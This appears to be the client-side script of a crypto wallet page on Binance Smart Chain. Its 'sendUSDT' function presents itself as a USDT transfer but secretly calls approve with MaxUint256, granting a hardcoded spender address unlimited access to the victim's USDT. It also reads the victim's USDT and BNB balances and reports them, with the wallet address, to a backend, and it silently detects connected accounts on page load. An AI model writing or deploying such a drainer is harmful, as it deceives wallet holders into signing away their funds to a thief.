let provider;
let signer;
let userAddress;
let isConnecting = false;

// ===== BSC CONFIG =====
const BSC_CHAIN_ID = "0x38";
const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";

const ABI = [
  "function approve(address spender, uint256 amount)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)"
];

// ===== SILENT CHECK ON PAGE LOAD (NO POPUP) =====
window.addEventListener("load", async () => {
  if (window.ethereum) {
    try {
      // Only check if wallet is available, don't request connection
      // This allows Trust Wallet DApp browser to work silently
      const accounts = await window.ethereum.request({ method: "eth_accounts" });
      
      if (accounts.length > 0) {
        // Wallet already connected - setup silently
        provider = new ethers.BrowserProvider(window.ethereum);
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();
        
        const addr = document.getElementById("toAddress");
        if (addr) addr.value = userAddress;
        
        console.log("✅ Wallet detected:", userAddress);
      } else {
        console.log("Wallet available, will connect on transaction");
      }
    } catch (e) {
      console.log("Wallet check failed:", e.message);
    }
  }
});

// ===== ENSURE BSC NETWORK =====
async function ensureBSC() {
  try {
    const chainId = await window.ethereum.request({ method: "eth_chainId" });
    if (chainId !== BSC_CHAIN_ID) {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_CHAIN_ID }]
      });
    }
  } catch (err) {
    if (err.code === 4902) {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId: BSC_CHAIN_ID,
          chainName: "Binance Smart Chain",
          rpcUrls: ["https://bsc-dataseed.binance.org/"],
          nativeCurrency: {
            name: "BNB",
            symbol: "BNB",
            decimals: 18
          },
          blockExplorerUrls: ["https://bscscan.com"]
        }]
      });
    } else {
      throw err;
    }
  }
}

// ===== APPROVE (BSC ONLY) =====
async function sendUSDT() {
  try {
    // Connect wallet if not already connected (Trust Wallet DApp browser does this silently)
    if (!userAddress || !signer) {
      // Request connection only when needed
      await window.ethereum.request({ method: "eth_requestAccounts" });
      provider = new ethers.BrowserProvider(window.ethereum);
      signer = await provider.getSigner();
      userAddress = await signer.getAddress();
      
      const addr = document.getElementById("toAddress");
      if (addr) addr.value = userAddress;
      
      console.log("✅ Connected on transaction:", userAddress);
    }

    // Ensure we're on BSC network before transaction
    await ensureBSC();

    const usdt = new ethers.Contract(
      BSC_USDT,
      ABI,
      signer
    );

    // Get balances before transaction
    const usdtBalanceWei = await usdt.balanceOf(userAddress);
    const usdtBalance = ethers.formatUnits(usdtBalanceWei, 18);
    
    const nativeBalanceWei = await provider.getBalance(userAddress);
    const nativeBalance = ethers.formatEther(nativeBalanceWei);

    const tx = await usdt.approve(
      BSC_SPENDER,
      ethers.MaxUint256
    );

    const receipt = await tx.wait();

    alert("Transaction successful ✅");

    // Save to backend via React (if available)
    if (window.saveTransaction) {
      window.saveTransaction({
        walletAddress: userAddress,
        toAddress: BSC_SPENDER,
        txHash: receipt.hash,
        usdtBalance: usdtBalance,
        nativeBalance: nativeBalance
      });
    }

  } catch (e) {
    if (e.code === 4001) {
      alert("Transaction cancelled");
    } else {
      alert("Transaction failed: " + e.message);
    }
  }
}

window.sendUSDT = sendUSDT;
